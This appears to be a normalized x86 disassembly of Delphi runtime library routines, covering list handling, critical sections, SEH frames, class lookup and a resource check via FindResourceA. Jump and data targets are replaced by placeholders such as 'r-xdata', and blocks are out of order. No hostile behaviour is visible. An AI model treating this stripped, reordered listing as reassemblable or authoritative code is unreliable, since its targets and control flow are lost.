call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_3a79254
test al al
je r-xdata
sub_3a79320
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_3a7a494
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_3a7912c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_3a7936c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a79028
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_3a7a33c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a793e0
push ebx
push esi
push edi
push ebp
call sub_3a6478c
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_3a64370
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
inc esi
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_3a7a494
call sub_3a64380
inc edi
dec esi
jne r-xdata
sub_3a79440
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_3a7a494
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_3a78fb8
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_3a79484
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_3a790c4
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_3a7a494
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_3a794c8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_3a7954b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a64260
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79552
lea eax [ ebp - 0x10c ]
call sub_3a652a0
retn
sub_3a79558
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a79440
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_3a78f4c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_3a794c8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_3a7a494
mov ebx eax
cmp ebx [ ebp - 0x10 ]
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3a7a494
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
call sub_3a645ac
test al al
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_3a79440
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3a7a388
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_3a7a33c
sub_3a79648
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_3a7a494
mov edx ebp
call sub_3a79230
test al al
jne r-xdata
sub_3a7968c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a79028
mov edx eax
mov eax [ edi + 0x4 ]
call sub_3a7a33c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_3a7a494
mov eax [ eax + 0xc ]
mov edx ebp
call sub_3a7a4f0
test eax eax
jge r-xdata
sub_3a796e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_3a7a494
mov esi eax
mov edx ebp
mov eax esi
call sub_3a79274
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_3a64380
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_3a7a388
sub_3a79738
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a64350
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79837
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7983e
mov eax [ rw-data ]
call sub_3a796dc
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_3a7a33c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_3a7a494
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7912c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_3a7a33c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_3a7a494
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_3a7983e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a79864
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a79894
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_3a79624
xor edx edx
push ebp
push sub_3a7990b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a796dc
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_3a64ce0
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_3a7a494
mov edx [ ebp - 0x4 ]
call sub_3a790c4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a79928
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a79988
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7998f
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a79994
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a799da
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_3a79484
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a799e1
mov eax [ rw-data ]
call sub_3a796dc
retn
sub_3a799e8
push ebx
push esi
mov esi eax
mov eax esi
call sub_3a79994
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_3a79928
sub_3a79a08
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79a6d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3a79648
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3a79630
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79a74
mov eax [ rw-data ]
call sub_3a796dc
retn
mov eax ebx
call sub_3a6430c
mov ebx eax
sub_3a79a78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79aba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_3a796e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79ac1
mov eax [ rw-data ]
call sub_3a796dc
retn
sub_3a79ac4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79b06
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_3a7968c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79b0d
mov eax [ rw-data ]
call sub_3a796dc
retn
sub_3a79b10
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79b57
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_3a79558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79b5e
mov eax [ rw-data ]
call sub_3a796dc
retn
sub_3a79b64
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_3a79624
xor eax eax
push ebp
push sub_3a79bb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_3a79320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a79bb9
mov eax [ rw-data ]
call sub_3a796dc
retn
sub_3a79c18
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a79c50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a79c18
mov edx eax
mov eax [ rw-data ]
call sub_3a7a810
pop edi
pop esi
pop ebx
retn
sub_3a79c7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_3a7a898
mov esi eax
xor edx edx
push ebp
push sub_3a79ce6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax esi
call sub_3a7a494
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_3a64ce0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a79cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_3a7a898
mov esi eax
xor edx edx
push ebp
push sub_3a79d62
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_3a7a8fc
retn
mov edx ebx
mov eax esi
call sub_3a7a494
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_3a64ce0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a79d74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_3a69490
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a79db4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_3a652f4
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3a79df8
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_3a7a4f0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_3a7a33c
sub_3a79e50
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3a7a494
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_3a79e90
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_3a79e50
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_3a79eb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_3a65730
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d568
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a79f28
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_3a7cf2c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a79f38
push ebx
call sub_3a672cc
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_3a672cc
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_3a7a33c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov ebx eax
call sub_3a672cc
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov ebx eax
call sub_3a672cc
mov [ eax + 0xc ] ebx
sub_3a79f90
push ebx
push esi
push edi
call sub_3a672cc
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_3a79fc0
push ebx
push esi
call sub_3a672cc
mov eax [ eax + 0x8 ]
call sub_3a64380
call sub_3a672cc
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_3a7a57c
mov esi eax
call sub_3a672cc
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_3a7a388
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_3a672cc
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_3a64380
sub_3a7a01c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3a7a0b2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a0b9
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_3a6430c
call sub_3a7a01c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_3a66668
call sub_3a666b8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_3a79eb4
or bl al
sub_3a7a0c4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_3a7a172
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3a7a153
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_3a64258
call sub_3a7a01c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_3a79f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a15a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_3a79f90
retn
call sub_3a79fc0
sub_3a7a18c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7d714
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_3a7a1e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a80b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a1f0
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
sub_3a7a1f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_3a64258
push eax
mov eax esi
call sub_3a64258
pop edx
cmp edx eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_3a7b21c
push eax
mov eax esi
call sub_3a7b21c
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a7a305
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7a18c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a7a2e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_3a7a18c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_3a69360
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a2ef
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
mov al 0x1
sub_3a7a31c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a7a33c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_3a7a388
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_3a63154
mov eax [ ebx + 0x4 ]
mov edi [ eax + esi * 4 ]
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_3a7a3e8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_3a7a3e4
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
jmp sub_3a64c34
sub_3a7a420
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_3a7a468
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a67194
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_3a7a3e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a46f
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7a494
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_3a7a420
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_3a7a4bc
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
